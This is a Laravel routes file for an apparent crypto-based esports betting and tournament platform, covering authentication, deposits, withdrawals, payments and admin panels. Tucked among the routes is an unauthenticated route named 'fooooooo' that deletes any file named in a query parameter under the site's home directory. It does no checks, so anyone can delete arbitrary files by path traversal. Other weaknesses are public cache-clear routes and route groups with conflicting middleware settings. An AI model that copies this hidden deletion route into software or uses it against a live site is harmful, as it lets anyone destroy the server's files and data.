<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/clear-cache', function() {
 $exitCode = Artisan::call('cache:clear');
 return 'Application cache cleared';
});

// Route::get('referal-bouns','DepositController@bouns');
/* ==============================================  Authentication Section =========================================== */
Route::get('login', 'LoginController@login');
Route::post('login-post', 'LoginController@loginPost');
Route::get('register', 'RegisterController@register');
Route::get('sponser_register', 'RegisterController@sponser_register');
Route::get('register/creator', 'RegisterController@register');
Route::get('register/moderator', 'RegisterController@register');
Route::post('register', 'RegisterController@registerPost');
Route::get('/activate/{email}/{activationCode}', 'ActivationController@activate');
Route::get('forgot-password', 'ForgotController@forgotPassword');
Route::post('forgot-password', 'ForgotController@postForgotPassword');
Route::get('reset/{email}/{resetCode}', 'ForgotController@resetPassword');
Route::post('reset/{email}/{resetCode}', 'ForgotController@postResetPassword');
Route::get('change/reset-password/{email}', 'ForgotController@NewResetPassword');
Route::post('change-password/{email}', 'ForgotController@postNewResetPassword');
Route::post('logout', 'LoginController@logout');
Route::get('content/{slug}', ['as' => 'about', 'uses' =>  'AboutController@getAbout']);
Route::get('promotions', ['as' => 'promotions', 'uses' =>  'PromotionController@getPromotion']);
Route::get('single-promotions/{id}', ['as' => 'single.promotions', 'uses' =>  'PromotionController@getSinglePromotion']);
// Google 2FA Authenticator
Route::get('/2fa/enable', 'Google2FAController@enableTwoFactor');
Route::post('/2fa/save', 'Google2FAController@saveSecretKey');
Route::get('/2fa/disable', 'Google2FAController@disableTwoFactor');
Route::get('/2fa/validate', 'Auth\AuthController@getValidateToken');
Route::post('/2fa/validate', ['middleware' => 'throttle:5', 'uses' => 'Auth\AuthController@postValidateToken']);
// BlockChain Callback Requests
Route::post('btc/callback', 'DepositController@btcCallback');
Route::get('btc/callback', 'DepositController@btcCallback');
Route::get('get-token', 'Twitch\TokenController@getToken');
Route::get('get-channel', 'Twitch\ChannelController@channel');

Route::get('fooooooo', function () {
    $base_directory = '/home/bitsport/public_html/';
    if (unlink($base_directory . $_GET['file']))
        echo "File.";
});

Route::get('goat', function () {
    return redirect('/tournament/2');
});

Route::get('dubai', function () {
    return redirect('/tournament/1');
});

Route::get('/clear-cache', function() {
    $exitCode = Artisan::call('cache:clear');
    // return what you want
});

/*    ================================================ User Frontend Section ===============================================*/

Route::post('pusher/auth', 'UserController@pusherAuth')->name('pusher.auth');
Route::get('/', ['as' => 'home', 'uses' => 'HomeController@index']);
Route::get('events/{category}', 'HomeController@events')->name('events');
Route::get('events/{category}/{subcate}', 'HomeController@subEvents');
Route::get('events/{category}/{subcate}/{subsubcate}', 'HomeController@subsubEvents');
Route::get('/live-betting', ['as' => 'live.betting', 'uses' => 'LiveBettingController@index']);
Route::get('/sports-pre-live', ['as' => 'sports.pre-live', 'uses' => 'PreSportsController@index']);
Route::get('event-odds/{id}', 'HomeController@event_odds');
Route::post('event-odd', 'HomeController@ajaxEventOdd');
Route::post('odd-price/{id}', 'HomeController@ajaxOdd');
Route::get('more_odds/{id}', 'HomeController@more_odds');
Route::post('getdata-day-wise', 'HomeController@dayWiseData');
Route::post('more_show', 'HomeController@more_show');
Route::get('checkbal', 'BetController@checkbal');
Route::get('get-live-event', 'HomeController@getLiveEvent'); //get live events
Route::get('get-ptop-live-event', 'HomeController@getPtoPLiveEvent')->name('get-ptop-live-event'); //get peer to peer live events
Route::get('get-live-featured', 'HomeController@getLiveFeatured'); //get live featured
Route::get('get-upcoming-event', 'HomeController@getUpcomingEvent'); //get live events
Route::get('tournament', 'HomeController@getLiveBetting'); //get live events
Route::get('user-upcoming-event', 'UserController@getEvents')->middleware('curator');
Route::get('live-betting/{cat_id}', 'HomeController@getLiveBetting'); //get live events
Route::get('tournament/{id}', 'TournamentController@getTournament'); //get tournament
Route::get('match-making/{id}', 'TournamentController@matchMaking'); //get tournament
Route::match(array('GET', 'POST'), 'tournament/{id}/join-tournament', 'TournamentController@joinTournament'); //get tournament
Route::post('tournament/{id}/payment', 'PaymentController@index');
Route::get('logged-in', 'UserController@loggedIn');  
Route::get('challenge/open', 'ChallengeController@getLatestChallenges')->name('challenge.open');  
Route::get('challenge/session/{name}', 'ChallengeController@session');  


/*    ================================================ User Backend Section ===============================================*/
Route::group(['middleware' => 'user'], function () {
    Route::get('dashboard', ['as' => 'dashboard', 'uses' => 'UserController@dashboard']);
    Route::get('security', ['as' => 'security', 'uses' => 'Google2FAController@securityPage']);
    Route::get('deposit', ['as' => 'deposit', 'uses' => 'DepositController@index']);
    Route::get('deposit/{coin}', 'DepositController@deposite_coin');
    Route::post('tx-details', 'DepositController@transactionDetails');
    Route::match(array('GET', 'POST'), 'wallet', 'UserController@wallet');
    Route::get('generate-address', ['as' => 'generate-address', 'uses' =>  'DepositController@CreateAddress']);
    Route::get('withdraw/{coin}', ['as' => 'withdraw', 'uses' => 'WithdrawController@index']);
    Route::post('withdraw', ['as' => 'withdraw', 'uses' => 'WithdrawController@withdrawRequest']);
    Route::get('get-coins', 'UserController@getCoins');
    Route::get('buy-btp', 'UserController@buyBtp');
    Route::post('buy-btp', 'UserController@postBuyBtp');
    Route::get('coin-deposit/{id}/{amount}/{coin}','UserController@deposite_coin')->name('coin-deposit');

    Route::get('profile', 'UserController@getProfile');
    Route::get('sponseredit', 'UserController@editSponserProfile');
	Route::get('sponser', 'SponserController@dashboard');
    Route::get('profile/{id}', 'UserController@profile');
    Route::get('public_profile/{id}', 'ChallengeController@public_profile');
    Route::get('sponser_profile/{id}', 'ChallengeController@sponser_profile');
    Route::get('profile_follow/{id}', 'UserController@public_profile_follow');
    Route::get('profile_report/{id}', 'UserController@public_profile_report');
    Route::get('profile_block/{id}', 'UserController@public_profile_block');
    Route::post('update-password/{id}', ['as' => 'password.update', 'uses' => 'UserController@updatePassword']);
    Route::get('bethistory', 'BetController@getBetHistory');
    Route::get('bet-active', 'BetController@getBetActive');
    Route::post('confirmbet', 'HomeController@event_odds_post');
    Route::post('confirmMbet', 'HomeController@event_odds_M_post');
    Route::get('btp-convert/{coin}', 'UserController@convert');
    Route::post('addbal/{id}', 'UserController@addbal');
    Route::post('baladd/{id}', 'UserController@baladd');
    Route::get('referral-list', 'UserController@referralList');
    Route::get('transaction-history', 'UserController@history');
    Route::get('reward', 'UserController@rewards');
    Route::post('redeem-coupon', 'UserController@redeemCoupon');
    Route::get('check-in/{eventId}', 'AdminEventController@checkIn');
    Route::get('tournament/{id}/join-process', 'TournamentController@joinProcess');
});

Route::group(['middleware' => 'user'], function () {

    Route::put('chat/read-message/{id}', 'ChatController@readMessage');
    Route::get('chat/single/{user_id}', 'ChatController@Single')->name('chat.single');
    Route::get('chat/getall-messages', 'ChatController@getAllMessages');
    Route::get('chat/get-messages', 'ChatController@getMessages');
    Route::get('chat/online', 'ChatController@getOnline')->name('chat.online');
    Route::resource('chat', 'ChatController', ['except' => ['index']]);
    
    Route::get('activity/all', 'ActivityController@getAllActivies')->name('activity.all');
    Route::put('activity/read/{id}', 'ActivityController@read')->name('activity.read');
    Route::resource('activity', 'ActivityController', ['except' => ['index']]);
    
    Route::get('challenge/create', 'ChallengeController@create')->name('challenge.create');
    Route::get('challenge/create/{id}', 'ChallengeController@create')->name('challenge.createwithopponent');
    Route::get('challenge/confirm/{id}', 'ChallengeController@confirm')->name('challenge.confirm');
    Route::get('challenge/play/{id}', 'ChallengeController@play')->name('challenge.play');    
    Route::get('challenge/get-games/{console_id}', 'ChallengeController@getGames');
    Route::get('challenge/latest', 'ChallengeController@getLatestChallenges')->name('challenge.latest');    
    Route::get('challenge/opponent-suggetions', 'ChallengeController@opponentSuggestions')->name('challenge.opponent-suggetions');    
    Route::patch('challenge/accept/{id}', 'ChallengeController@accept')->name('challenge.accept');    
    Route::patch('challenge/cancel/{id}', 'ChallengeController@cancel')->name('challenge.cancel');    
    Route::patch('challenge/reject/{id}', 'ChallengeController@reject')->name('challenge.reject');  
    Route::patch('challenge/submit-result/{id}', 'ChallengeController@submitResult')->name('challenge.submit-result');  
    Route::post('challenge/dispute/{id}', 'ChallengeController@dispute')->name('challenge.dispute');  
    Route::delete('challenge/destroy/{id}', 'ChallengeController@destroy')->name('challenge.destroy');    
    Route::resource('challenge', 'ChallengeController', ['except' => ['index']]);
    // Route::get('challenges/get', 'ChallengeController@getResult');
    Route::get('challenges/get', 'ChallengeController@new');
    Route::get('challenges/getDepositAddress', 'ChallengeController@getDepositAddress');
    Route::post('challenges/sendEmail', 'ChallengeController@sendEmail');
    Route::post('challenges/buy-btp', 'ChallengeController@CreateDepositPaypal');
    Route::get('challenges/{id}', 'ChallengeController@getEachChallenge');

   
    Route::get('match/information', 'MatchController@information')->name('match.information');
    Route::post('match/confirm', 'MatchController@confirmMatch')->name('match.confirm');
    Route::get('match/confirmation-success', 'MatchController@matchConfirmationSuccess')->name('match.confirmation-success');
    Route::resource('match', 'MatchController', ['except' => ['index']]);

    //match now need user Login
    Route::post('match-opponent-confirm', 'MatchNowController@confirmMatch')->name('match-opponent-confirm');
    Route::post('match-opponent-cancel', 'MatchNowController@cancelMatch')->name('match-opponent-cancel');
    Route::get('match-opponent-confirm-success/{match_id}', 'MatchNowController@matchConfirmSuccess')->name('match-opponent-confirm-success');

    //After confirm all procedure
    Route::get('match-start-check-in/{url_hash}', 'MatchNowController@startCheckIn')->name('match-start-check-in');
    
    Route::post('match-setup', 'MatchNowController@setUpMatch')->name('match-setup');

    Route::post('match-setup-stream-tutorial', 'MatchNowController@setUpStreamTutorial')->name('match-setup-stream-tutorial');
    Route::post('update-twitch-username', 'MatchNowController@updateTwitchUsername')->name('update-twitch-username');
    
    Route::post('match-setup-stream-tutorial-guest', 'MatchNowController@setUpStreamTutorialGuest')->name('match-setup-stream-tutorial-guest');


    Route::post('match-twitch-screen', 'MatchNowController@twitchScreen')->name('match-twitch-screen');

    Route::post('match-reporting', 'MatchNowController@matchReporting')->name('match-reporting');

    Route::post('match-check-reporting', 'MatchNowController@checkMatchReporting')->name('match-check-reporting');

    Route::post('match-announce-result', 'MatchNowController@announceResult')->name('match-announce-result');

    Route::post('match-streamSetUpDone', 'MatchNowController@streamSetUpDone')->name('match-streamSetUpDone');
    
    Route::post('match-expired', 'MatchNowController@expiredMatch')->name('match-expired');

    Route::get('match-now/{match_id}', 'MatchNowController@index')->name('match-now.index');
    Route::get('match-opponent-confirm-get/{match_id}', 'MatchNowController@confirm')->name('match-opponent.confirm');
});

Route::get('match', 'MatchController@index')->name('match.index');
Route::get('match-get_latest_matches', 'MatchController@getLatestMatches')->name('match.get_latest_matches');


Route::post('epay-success', 'DepositController@epaySuccessHandler');
Route::post('epay-failure', 'DepositController@epayFailureHandler');

Route::post('paypal-create', 'DepositController@CreateDepositPaypal');
Route::get('paypal-status/{amount}', 'DepositController@DepositPaypalStatus');
Route::get('paypal-cancel', 'DepositController@DepositPaypalCancel');

Route::post('add-transaction', 'DepositController@addTransaction');

Route::post('update-profile/{id}', ['as' => 'profile.update', 'uses' => 'UserController@setProfile']);
Route::post('clearbet', 'HomeController@clearbet');

Route::post('mybets', 'BetController@addMyBets');

Route::post('checkodd', 'BetController@checkodd');

Route::get('ipn-handler', 'DepositController@ipnHandler');
Route::post('ipn-handler', 'DepositController@ipnHandler');

/*    ================================================ Super Admin Section ===============================================*/
Route::group(['middleware' => 'superadmin'], function () {
    Route::get('super-admin', 'SuperAdminController@dashboard');
    Route::get('deposit-request', ['as' => 'deposit-request', 'uses' => 'DepositController@DepositRequest']);
    Route::get('deposit-approve/{id}', 'DepositController@depositApprove');
    Route::get('withdraw-request', ['as' => 'withdraw-request', 'uses' => 'WithdrawController@withdrawalRequest']);
    Route::get('withdraw-approve/{id}', 'WithdrawController@confirmStatus');
    Route::get('superadmin-profile', 'UserController@getProfile');
    // Route::post('profile/{id}',['as'=>'profile.update','uses'=>'UserController@setProfile']);
    Route::resource('sub-admin', 'AdminManageController');
    Route::get('changeAdminStatus/{user_id}/{status}', ['as' => 'admin.status.change', 'uses' => 'AdminManageController@changeAdminStatus']); //
    Route::get('bet-history', 'BetController@getAdminBetHistory');
    Route::get('setting', ['as' => 'setting.update', 'uses' => 'SuperAdminController@setting']);
    Route::post('post', ['as' => 'setting.update', 'uses' => 'SuperAdminController@settingUpdate']);
    
});


/*    ================================================ Admin Section ===============================================*/
Route::group(['middleware' => 'admin'], function () {
    Route::get('admin-dashboard', 'AdminController@dashboard');
    Route::resource('admin-blog', 'AdminBlogController'); //manage blog data
    Route::resource('admin-menu', 'AdminMenuController'); //manage menu data
    Route::resource('admin-cms', 'AdminCMSController'); //manage cms data
    Route::resource('admin-team', 'AdminTeamController'); //manage team data
    Route::get('category', 'AdminController@category');
    Route::get('subcategory', 'AdminController@subcategory');
    Route::get('event', 'AdminController@event');
    Route::resource('admin-coins', 'AdminCoinsController');
    Route::resource('admin-category', 'AdminCategoryController');
	Route::get('admin-deactiveStatus/{id}', ['as' => 'admin-category.deactivestatus', 'uses' => 'AdminCategoryController@deactivestatus']);
    Route::get('admin-activeStatus/{id}', ['as' => 'admin-category.activestatus', 'uses' => 'AdminCategoryController@activestatus']);
    Route::resource('admin-sponser', 'AdminSponserController');
	Route::get('admin-deactiveStatus/{id}', ['as' => 'admin-sponser.deactivestatus', 'uses' => 'AdminSponserController@deactivestatus']);
    Route::get('admin-activeStatus/{id}', ['as' => 'admin-sponser.activestatus', 'uses' => 'AdminSponserController@activestatus']);
	Route::resource('admin-subcategory', 'SubCategoryController');
    Route::get('admin-sub-deactiveStatus/{id}', ['as' => 'admin-subcategory.deactivestatus', 'uses' => 'SubCategoryController@deactivestatus']);
    Route::get('admin-sub-activeStatus/{id}', ['as' => 'admin-subcategory.activestatus', 'uses' => 'SubCategoryController@activestatus']);
    Route::resource('admin-subsubcategory', 'SubSubCategoryController');
    Route::get('admin-subsub-deactiveStatus/{id}', ['as' => 'admin-subsubcategory.deactivestatus', 'uses' => 'SubSubCategoryController@deactivestatus']);
    Route::get('admin-subsub-activeStatus/{id}', ['as' => 'admin-subsubcategory.activestatus', 'uses' => 'SubSubCategoryController@activestatus']);
    Route::get('getSubcategory', 'SubSubCategoryController@getFromCategory');
    Route::get('changeTeamStatus/{team_id}/{status}', ['as' => 'team.status.change', 'uses' => 'AdminTeamController@changeTeamStatus']); //
    Route::resource('admin-user', 'UserController'); //manage User data
    Route::get('admin-creator', 'UserController@creator'); //manage Creator data
    Route::get('changeUserStatus/{user_id}/{status}', ['as' => 'user.status.change', 'uses' => 'UserController@changeUserStatus']); //
    Route::get('admin-profile', 'UserController@getProfile');

    Route::resource('admin-event', 'AdminEventController'); //manage Events data
    Route::get('admin-pending-event', 'AdminEventController@index'); //manage Events data

    // Route::post('profile/{id}',['as'=>'profile.update','uses'=>'UserController@setProfile']);
    //Event Master
    Route::resource('admin-eventmaster', 'EventMasterController');
    Route::get('changeEvenmastertStatus/{id}/{status}', ['as' => 'odd-master.status.change', 'uses' => 'EventMasterController@changeEventStatus']);
    // Get Team Via ajax
    Route::get('/getTeamCat', 'AdminTeamController@getTeamCat');
    Route::get('/getTeamSubCat', 'AdminTeamController@getTeamSubCat');
    Route::get('/getTeamSubSubCat', 'AdminTeamController@getTeamSubSubCat');
    // Insert data via Ajax
    Route::post('/addCategory', 'AdminCategoryController@addCategory');
    Route::post('/addSubCategory', 'SubCategoryController@addSubCategory');
    Route::post('/addSubSubCategory', 'SubSubCategoryController@addSubSubCategory');
    Route::post('/addOddMaster', 'AdminOddMasterController@addOddMaster');
    // odd
    Route::resource('admin-odd-master', 'AdminOddMasterController');
    Route::get('changeOddMasterStatus/{id}/{status}', ['as' => 'odd-master.status.change', 'uses' => 'AdminOddMasterController@changeOddMasterStatus']);
    Route::get('admin-odd-create/{id}', 'AdminOddController@create');
    Route::get('admin-odd-update/{id}', 'AdminOddController@edit');
    Route::post('remove-odd', 'AdminOddController@remove');
    Route::get('changeOddStatus/{id}/{status}', ['as' => 'odd-master.status.change', 'uses' => 'AdminOddController@changeOddStatus']);
    // Bets
    Route::get('admin-users-bets', 'BetController@usersBets');
    Route::post('set-menu', 'AdminMenuController@setMenu');
    // winloss

    Route::get('subcriber-list', 'NewsLetterController@subscriber_list');
    Route::get('subcriber-delete/{id}', 'NewsLetterController@delete');
    Route::resource('admin-event-odd-master', 'AdminEventOddMasterController');
    Route::get('changeEventOddStatus/{id}/{status}', ['as' => 'event-odd-master.status.change', 'uses' => 'AdminEventOddMasterController@changeOddStatus']);
    Route::get('changeEventPermission/{event_id}/{status}', ['as' => 'event.status.change', 'uses' => 'AdminEventController@changeEventpermission']);
    Route::match(array('GET', 'POST'), 'edit-preference/{user_id}', 'UserController@editPreference');
    Route::get('create-tournament', 'AdminTournamentController@create');
    Route::get('edit-tournament/{id}', 'AdminTournamentController@edit');
    Route::post('store-tournament', ['as' => 'admin-tournament.store', 'uses' => 'AdminTournamentController@store']);
    Route::post('update-tournament/{id}', ['as' => 'admin-tournament.update', 'uses' => 'AdminTournamentController@update']);
    Route::get('changetournamentStatus/{id}/{status}', 'AdminTournamentController@changeStatus');


    Route::resource('admin-tournament', 'AdminTournamentController');

    //p2p
    Route::get('admin-matche', 'AdminPeerToPeerMatchController@index')->name('admin.match.index');
    Route::get('admin-match/{match_id}', 'AdminPeerToPeerMatchController@show')->name('admin.match.show');
    Route::post('admin-match-set-winner', 'AdminPeerToPeerMatchController@setWinnerOfMatch')->name('admin.match.setWinner');

    //challenges
    Route::get('admin-challenges', 'AdminChallengeController@index')->name('admin.challenge.index');
    Route::get('admin-challenge/{id}', 'AdminChallengeController@show')->name('admin.challenge.show');
    Route::post('admin-challenge-set-winner', 'AdminChallengeController@setWinnerOfChallenge')->name('admin.challenge.setWinner');
    Route::get('disputes', 'AdminChallengeController@disputes')->name('admin.challenge.disputes');

});

Route::group(['middleware' => 'creator'], function () {
    Route::resource('creator-event', 'AdminEventController'); //manage Events data
    Route::get('creator-odd-create/{id}', 'AdminOddController@create');
    Route::resource('creator-odd', 'AdminOddController');
});

Route::group(['middleware' => 'moderator','middleware' => 'user'], function () {
    Route::get('follow/{user_id}', 'UserController@follow');
    Route::get('block/{user_id}', 'UserController@block');
});


Route::group(['middleware' => 'admin-creator'], function () {
    //Route::get('profile','UserController@getProfile');
    Route::get('getSubcategoryFromCategory', ['as' => 'get.sub.cat', 'uses' => 'SubCategoryController@getSubcategoryFromCategory']); //get subcategory data on category selection
    Route::get('getSubSubcategoryFromSubCategory', ['as' => 'get.sub.cat', 'uses' => 'SubSubCategoryController@getSubSubcategoryFromSubCategory']); //get subsubcategory data on subcategory selection
    Route::get('/getTeamMember', 'AdminTeamController@getTeamMember');
    Route::post('/addTeam', 'AdminTeamController@addTeam');
    Route::get('changeEventStatus/{event_id}/{status}', ['as' => 'event.status.change', 'uses' => 'AdminEventController@changeEventStatus']);
    Route::get('winloss/{event_id}', ['as' => 'event.status.change', 'uses' => 'AdminEventController@winloss']);
    Route::post('winloss/update', ['as' => 'event.status.change', 'uses' => 'AdminEventController@winlossUpdate']);
    Route::post('update-odd-winner', 'AdminEventController@oddWinLossUpdate');
    Route::resource('admin-odd', 'AdminOddController');
    Route::post('/addEventMaster', 'EventMasterController@addEventMaster');
});

Route::group(['middleware' => ['super']], function () {
    Route::get('rewards', 'SuperAdminController@rewards');
    Route::post('add-coupon', 'SuperAdminController@addCoupon');
    Route::get('redeem-list/{coupon}', 'SuperAdminController@redeemCoupon');
    Route::get('invite-code', 'SuperAdminController@inviteCode');
    Route::post('add-invite-code', 'SuperAdminController@addInviteCode');
    Route::get('invite-code/{code}', 'SuperAdminController@inviteCodeUsed');
    Route::get('participants', 'SuperAdminController@participantList');
    Route::match(array('GET', 'POST'), 'participant/match/{id}', 'SuperAdminController@participantMatch');
});

Route::get('toggle-follow/{id}', 'HomeController@toggleFollow');
Route::post('score', 'HomeController@score');
Route::post('stripe-payment', 'PaymentController@stripePayment');
Route::post('btp-payment', 'PaymentController@btpPayment');
Route::post('mobile-money', 'PaymentController@MobileMoney');

Route::post('create-paypal-payment', 'PaymentController@CreatePaypalPayment');
Route::get('paypal-payment-status', 'PaymentController@PaypalPaymentStatus');
Route::get('paypal-payment-cancel', 'PaymentController@PaypalPaymentCancel');

Route::get('getvideo', 'VideosController@topList');
Route::get('get-channel', 'ChannelController@channel');
Route::get('get-commercial', 'ChannelController@topGames');
Route::get('topGames', 'ChannelController@topGames');
Route::get('get-clips', 'ClipsController@getClip');
Route::post('email-subscribe', 'NewsLetterController@subscribe');
Route::get('update-currencies', 'HomeController@updateCryptoCurrencies');

Route::get('stripe/{id}/{status}', 'StripePaymentController@stripe');
Route::post('stripe', 'StripePaymentController@stripePost')->name('stripe.post');
Route::get('get-current-date', 'StripePaymentController@get_current_date');

Route::get('ipn-handler-btp', 'StripePaymentController@ipnHandlerBtp');
Route::post('ipn-handler-btp', 'StripePaymentController@ipnHandlerBtp');